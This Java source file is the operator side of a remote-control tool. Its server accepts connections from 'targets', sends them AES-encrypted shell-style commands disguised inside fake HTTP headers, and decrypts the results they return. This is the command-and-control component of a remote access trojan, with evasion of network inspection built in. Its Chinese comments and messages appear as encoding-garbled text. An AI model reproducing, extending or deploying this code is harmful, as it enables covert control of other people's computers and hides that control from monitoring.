package socks;

import constant.CheckCommands;
import encryption.AESOperator;
import property.Property;

import java.io.*;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;

/**
 * Զ�̿��ƶ�
 */
public class Server {

    public static void run() {
        ServerSocket server;
        //��ϵͳ��׼�����豸����BufferedReader����
        BufferedReader sin = new BufferedReader(new InputStreamReader(System.in));

        try {
            //���������˿�
            server = new ServerSocket(Property.port, 20, InetAddress.getByName(Property.addr));
            System.out.println("�����ɹ���\r\n�ȴ�Ŀ�����ӡ�");
            String clientAddr = null;

            while (true) {
                try {
                    //��ʼ����������
                    String type = "cmd";

                    //�ȴ�����
                    Socket socket = server.accept();

                    //��ȡһЩ������Ϣ
                    String tmpAddr = socket.getRemoteSocketAddress().toString().split(":")[0].substring(1);
                    String tmpPort = socket.getRemoteSocketAddress().toString().split(":")[1];

                    if (clientAddr == null || !clientAddr.equals(tmpAddr)) {
                        clientAddr = tmpAddr;
                        System.out.println("Ŀ���ַ��" + clientAddr);
                        type = "\\getInitInfo"; //��ȡһЩ������Ϣ
                        System.out.println("���룺\\help�鿴������Ϣ");
                    }

                    //��Socket����õ�������
                    BufferedReader is = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    //��Socket����õ������
                    BufferedWriter os = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));

                    String input = "";


                    if (type.equals("\\getInitInfo")) {
                        //��ȡһЩ������Ϣ
                    } else {
                        CheckCommands checkCommands = new CheckCommands(sin, type, input);
                        if (checkCommands.getBreaks().equals("break")) {
                            break;
                        }
                        type = checkCommands.getType();
                        input = checkCommands.getInput();
                    }

                    //���ݼ���
                    String data = type.concat("#!#:#!#").concat(input);
                    try {
                        data = AESOperator.getInstance().encrypt(data);
                    } catch (Exception e) {
                        System.err.println("���ܹ��̵����쳣��");
                    }

                    //αװ����
                    BufferedReader in = new BufferedReader(new InputStreamReader(Property.class.getResourceAsStream("/conf/boxResponse.context")));
                    String requestHeaders = "";
                    String tmpStr;
                    while ((tmpStr = in.readLine()) != null) {
                        // System.out.println(tmpStr);
                        requestHeaders += tmpStr + "\r\n";
                    }
                    in.close();

                    data = requestHeaders.concat("\r\n").concat(data);

                    //��Ŀ�귢��ָ��
                    os.write(data);
                    os.newLine();
                    os.flush();

                    //���յ��Ŀͻ�������
                    String result = "";
                    String line;
                    while ((line = is.readLine()) != null) {
                        result += line.concat("\r\n");
                    }
                    result = result.substring(result.lastIndexOf("rctrl_data_0303201=") + 19);

                    //���ݽ���
                    try {
                        result = AESOperator.getInstance().decrypt(result);
                    } catch (Exception e) {
                        System.err.println("���ܹ����쳣��");
                    }
                    if (result.startsWith("_error_:")) {
                        System.err.println(result);
                    } else {
                        System.out.println(result);
                    }

                    os.close();
                    is.close();
                    socket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                    System.err.println("IO�쳣�ˣ����ܴ˴����ӶԷ��Ѿ���ʧ���Է����������ƣ��������³��ԡ�\r\n������������ˡ�");
                }
            }
            server.close();
        } catch (IOException e) {
            //e.printStackTrace();
            System.err.println("��������ʧ�ܣ���ȷ���˿ڵ�������Ϣ��ȷ��");
        }
    }

}
